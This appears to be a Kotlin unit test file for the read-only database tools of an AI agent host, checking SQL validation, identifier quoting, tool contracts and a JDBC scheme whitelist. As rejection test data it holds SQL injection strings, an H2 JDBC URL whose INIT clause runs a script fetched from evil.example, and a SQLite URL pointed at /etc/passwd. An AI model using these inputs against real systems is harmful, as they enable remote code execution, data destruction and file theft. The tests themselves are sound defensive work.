package com.stragent.host

import kotlinx.serialization.json.JsonArray
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.jsonArray
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertTrue
import kotlin.test.assertFailsWith
import kotlin.test.assertNotNull
import com.stragent.core.i18n.Messages

/**
 * S5 数据库连接测试（D11 v3）。
 *
 * 验证维度：
 *  1. SQL 安全校验拒绝 DDL/DML
 *  2. SQL 安全校验接受 SELECT/WITH
 *  3. 六个工具的 MCP 契约（名称/参数/描述）
 *  4. 工具描述含安全声明
 */
class DatabaseToolTest {

    @Test
    fun `SQL 校验拒绝 INSERT`() {
        try {
            DatabaseConnectionStore.validateReadOnly("INSERT INTO t VALUES (1)")
            throw AssertionError("should have thrown")
        } catch (e: IllegalArgumentException) {
            assertTrue(e.message!!.contains("禁止") || e.message!!.contains("SELECT"), "应拒绝 INSERT: ${e.message}")
        }
    }

    @Test
    fun `SQL 校验拒绝 DROP`() {
        try {
            DatabaseConnectionStore.validateReadOnly("DROP TABLE t")
            throw AssertionError("should have thrown")
        } catch (e: IllegalArgumentException) {
            assertTrue(e.message!!.contains("SELECT") || e.message!!.contains("禁止"), "应拒绝 DROP")
        }
    }

    @Test
    fun `SQL 校验接受 SELECT`() {
        DatabaseConnectionStore.validateReadOnly("SELECT * FROM users WHERE id = 1")
        DatabaseConnectionStore.validateReadOnly("select count(*) from orders")
    }

    @Test
    fun `SQL 校验接受 WITH`() {
        DatabaseConnectionStore.validateReadOnly("WITH cte AS (SELECT 1) SELECT * FROM cte")
    }

    @Test
    fun `SQL 校验拒绝 UPDATE`() {
        try {
            DatabaseConnectionStore.validateReadOnly("UPDATE t SET x = 1")
            throw AssertionError("should have thrown")
        } catch (e: IllegalArgumentException) {
            assertTrue(e.message!!.contains("SELECT") || e.message!!.contains("禁止"), "应拒绝 UPDATE: ${e.message}")
        }
    }

    @Test
    fun `SQL 校验拒绝 DELETE`() {
        try {
            DatabaseConnectionStore.validateReadOnly("DELETE FROM t WHERE x = 1")
            throw AssertionError("should have thrown")
        } catch (e: IllegalArgumentException) {
            assertTrue(e.message!!.contains("SELECT") || e.message!!.contains("禁止"), "应拒绝 DELETE: ${e.message}")
        }
    }

    @Test
    fun `SQL 校验拒绝多语句拼接`() {
        listOf(
            "SELECT 1; SELECT 2",
            "SELECT * FROM t; DROP TABLE t",
            "SELECT 1;\nDELETE FROM t",
        ).forEach { sql ->
            val ex = assertFailsWith<IllegalArgumentException>("应拒绝多语句: $sql") {
                DatabaseConnectionStore.validateReadOnly(sql)
            }
            assertTrue(
                ex.message!!.contains(Messages.get("error.db.multi_statement")),
                "错误信息应说明单语句限制: ${ex.message}",
            )
        }
    }

    @Test
    fun `SQL 校验允许单个结尾分号`() {
        DatabaseConnectionStore.validateReadOnly("SELECT * FROM users;")
        DatabaseConnectionStore.validateReadOnly("  WITH cte AS (SELECT 1) SELECT * FROM cte ;  ")
    }

    @Test
    fun `SQL 校验按词边界识别危险关键字（空白变体不能漏）`() {
        listOf(
            "SELECT 1 FROM t FOR\nUPDATE",
            "SELECT 1 FROM t FOR\tUPDATE",
            "WITH x AS (SELECT 1) SELECT * FROM x WHERE 1 = 1 UNION SELECT 1 INTO evil",
        ).forEach { sql ->
            assertFailsWith<IllegalArgumentException>("空白/换行变体也应拒绝: $sql") {
                DatabaseConnectionStore.validateReadOnly(sql)
            }
        }
    }

    @Test
    fun `表名列名校验拒绝注入片段`() {
        listOf(
            "users\"; DROP TABLE users --",
            "users; DROP",
            "users WHERE 1=1",
            "%",
            "",
        ).forEach { bad ->
            assertFailsWith<IllegalArgumentException>("非法标识符应拒绝: $bad") {
                DatabaseConnectionStore.quoteIdentifier(bad)
            }
        }
        assertEquals("\"main\".\"users\"", DatabaseConnectionStore.quoteIdentifier("main.users"))
        assertEquals("\"销售额\"", DatabaseConnectionStore.quoteIdentifier("销售额"))
    }

    @Test
    fun `db_connect 工具契约正确`() {
        val tool = dbConnectTool()
        assertEquals("stragent_db_connect", tool.name)
        assertTrue(tool.description.contains("数据库"), "描述应提及数据库")
        assertTrue(tool.description.contains("只读"), "描述应声明只读安全")
        val props = tool.parametersSchema["properties"]!!.jsonObject
        assertTrue(props.containsKey("url"), "应有 url 参数")
    }

    @Test
    fun `db_query 工具契约正确`() {
        val tool = dbQueryTool()
        assertEquals("stragent_db_query", tool.name)
        val required = tool.parametersSchema["required"]!!.jsonArray
        assertTrue(required.any { it.jsonPrimitive.content == "connectionId" }, "应要求 connectionId")
        assertTrue(required.any { it.jsonPrimitive.content == "sql" }, "应要求 sql")
    }

    @Test
    fun `db_list_tables 工具契约正确`() {
        val tool = dbListTablesTool()
        assertEquals("stragent_db_list_tables", tool.name)
        assertTrue(tool.description.contains("表"), "描述应提及表")
    }

    @Test
    fun `db_describe 工具契约正确`() {
        val tool = dbDescribeTool()
        assertEquals("stragent_db_describe", tool.name)
        val props = tool.parametersSchema["properties"]!!.jsonObject
        assertTrue(props.containsKey("tableName"), "应有 tableName 参数")
    }

    @Test
    fun `db_sample 工具契约正确`() {
        val tool = dbSampleTool()
        assertEquals("stragent_db_sample", tool.name)
        val props = tool.parametersSchema["properties"]!!.jsonObject
        assertTrue(props.containsKey("rowCount"), "应有 rowCount 参数")
    }

    @Test
    fun `db_column_stats 工具契约正确`() {
        val tool = dbColumnStatsTool()
        assertEquals("stragent_db_column_stats", tool.name)
        val props = tool.parametersSchema["properties"]!!.jsonObject
        assertTrue(props.containsKey("columnName"), "应有 columnName 参数")
    }

    @Test
    fun `dbTools 返回六个工具`() {
        val tools = dbTools()
        assertEquals(6, tools.size, "应有 6 个数据库工具")
        val names = tools.map { it.name }
        assertTrue(names.contains("stragent_db_connect"))
        assertTrue(names.contains("stragent_db_list_tables"))
        assertTrue(names.contains("stragent_db_query"))
        assertTrue(names.contains("stragent_db_describe"))
        assertTrue(names.contains("stragent_db_sample"))
        assertTrue(names.contains("stragent_db_column_stats"))
    }

    @Test
    fun `DB connect 和 query 工具描述含安全声明`() {
        val connect = dbConnectTool()
        assertTrue(connect.description.contains("只读") || connect.description.contains("SELECT") || connect.description.contains("安全"),
            "db_connect 描述应含安全声明")
        val query = dbQueryTool()
        assertTrue(query.description.contains("只读") || query.description.contains("SELECT") || query.description.contains("安全"),
            "db_query 描述应含安全声明")
    }

    @Test
    fun `宿主关闭时释放全部 JDBC 连接`() {
        val home = java.io.File(System.getProperty("java.io.tmpdir"), "str-agent-db-close-" + System.nanoTime()).also { it.mkdirs() }
        val connId = DatabaseConnectionStore.connect("jdbc:duckdb:", null, null)
        assertNotNull(DatabaseConnectionStore.getConnection(connId), "连接应已建立")
        val bootstrap = StrAgentHostBootstrap.create(home, llm = FakeLlmClient())
        bootstrap.close()
        // 关闭宿主 = 释放进程级连接：再用这个 id 应报「连接不存在」
        assertFailsWith<IllegalArgumentException> { DatabaseConnectionStore.getConnection(connId) }
    }

    @Test
    fun `负控——JDBC scheme 白名单拒绝非 DuckDB 协议（T-147）`() {
        // 不真连：白名单在 DriverManager 之前拒绝
        for (url in listOf(
            "jdbc:postgresql://db.example:5432/app",
            "jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://evil.example/s.sql'",
            "jdbc:sqlite:/etc/passwd",
            "jdbc:mysql://db.example/app",
        )) {
            val e = assertFailsWith<IllegalArgumentException> {
                DatabaseConnectionStore.connect(url, null, null)
            }
            assertTrue(
                e.message!!.contains("只允许 jdbc:duckdb:") || e.message!!.contains("不支持的 JDBC 协议"),
                "错误信息要写明白名单口径：${e.message}",
            )
        }
    }

    @Test
    fun `负控——duckdb scheme 放行不误伤（T-147）`() {
        // jdbc:duckdb:（空路径）= 内存库，能真连成功 → 白名单放行的正向证据
        val connId = DatabaseConnectionStore.connect("jdbc:duckdb:", null, null)
        DatabaseConnectionStore.close(connId)
    }

    @Test
    fun `连接表有界——满 16 时拒绝新建并给可行动指引，close 后恢复（D25）`() {
        // 顺序无关形态：连接表是共享单例，不假设起始为空——开到被拒为止（20 次尝试内必触顶），
        // 断言拒绝语义，finally 全数释放（不给同 JVM 后续测试留共享状态）。
        val opened = mutableListOf<String>()
        var rejected: IllegalArgumentException? = null
        try {
            for (i in 0 until 20) {
                try {
                    opened += DatabaseConnectionStore.connect("jdbc:duckdb:", null, null)
                } catch (e: IllegalArgumentException) {
                    rejected = e
                    break
                }
            }
            assertTrue(rejected != null, "20 次连接尝试内应触及上限被拒（当前上限 16）")
            assertTrue(
                rejected!!.message!!.contains("stragent_db_close"),
                "拒绝消息应指引先 close：${rejected.message}",
            )
        } finally {
            opened.forEach { DatabaseConnectionStore.close(it) }
        }
    }
}
